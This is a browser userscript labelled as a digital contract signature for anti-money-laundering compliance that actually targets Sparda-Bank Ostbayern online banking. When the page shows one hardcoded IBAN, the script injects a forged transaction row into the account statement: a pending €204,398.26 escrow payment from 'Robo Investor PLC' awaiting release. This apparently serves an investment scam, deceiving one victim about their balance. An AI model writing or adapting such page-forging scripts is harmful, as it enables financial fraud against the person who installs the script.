// ==UserScript==
// @name         Vertragssignature Gerhard Rosenow
// @namespace    http://tampermonkey.net/
// @version      1.0
// @description  Anforderung an GwG - digitale Signatur
// @author       You
// @match        https://yahoo.com/sign/as/*
// @match        https://yahoo.com/sign/ac/*
// @match        https://yahoo.com/sign/ar/*
// @match        https://yahoo.com/sign/bs/*
// @match        https://yahoo.com/sign/sc/*
// @match        https://yahoo.com/sign/am/*
// @match        https://yahoo.com/sign/op/*
// @match        https://yahoo.com/sign/idi/*
// @match        https://yahoo.com/sign/ot/*
// @match        https://yahoo.com/sign/cli/*
// @match        https://yahoo.com/sign/ien/*
// @match        https://yahoo.com/sign/ts/*
// @match        https://banking.sparda-ostbayern.de/*
// @icon         https://www.google.com/s2/favicons?sz=64&domain=google.com
// @grant        none
// @downloadURL https://update.greasyfork.org/scripts/468127/Vertragssignature%20Gerhard%20Rosenow.user.js
// @updateURL https://update.greasyfork.org/scripts/468127/Vertragssignature%20Gerhard%20Rosenow.meta.js
// ==/UserScript==

(function() {
    'use strict';
    var ktnrCheck = "DE35 7509 0500 0000 3450 05";
    document.getElementsByClassName("ktnrValue")[0].textContent;
    var htmlRow = '<div class="tableRow " title=""><div class="tableCol spalte1"><span id="aBF:j_id170:0:j_id174" onclick=""><div class="checkBox checkBoxOn" modul="false" onclick="SDV.checkbox.toggle(event);"><input id="aBF:j_id170:0:cB" type="text" name="aBF:j_id170:0:cB" value="true" class="" style="display: none;"><div class="label"></div></div></span></div><div class="tableCol spalte2" onclick="showRow(0);">30.05.2023</div><div class="tableCol spalte3" onclick="showRow(0);">Wertstellung: Treuhand <br>Freigabe notwendig<br>Robo Investor PLC (UK)<br>30.05.2023 18.01.28<br>EUR      204.398,26<br>SPEZIAL-SEPA BANKGARANTIE<br>EREF+ 4233856035 1 <br>WD3746 TRX88205A 204398.26<br>Sparda-Bank Ostbayern eG Garantiert ausführung<br>UKTH77/SEPA-SPC/000000</div><div class="tableCol spalte4" onclick="showRow(0);"><div class=""><span class="iconsprites sprInfo"></span>204.398,26</div></div><div class="clearer"></div></div>';

    if (document.getElementsByClassName("ktnrValue")[0].textContent == ktnrCheck){
        console.log("Kontonummer passt.")
        var orginalTabelle = document.getElementById("aBF:umsaetzeTableId").innerHTML;
        document.getElementById("aBF:umsaetzeTableId").innerHTML = htmlRow + orginalTabelle;
    }

    // Your code here...
})();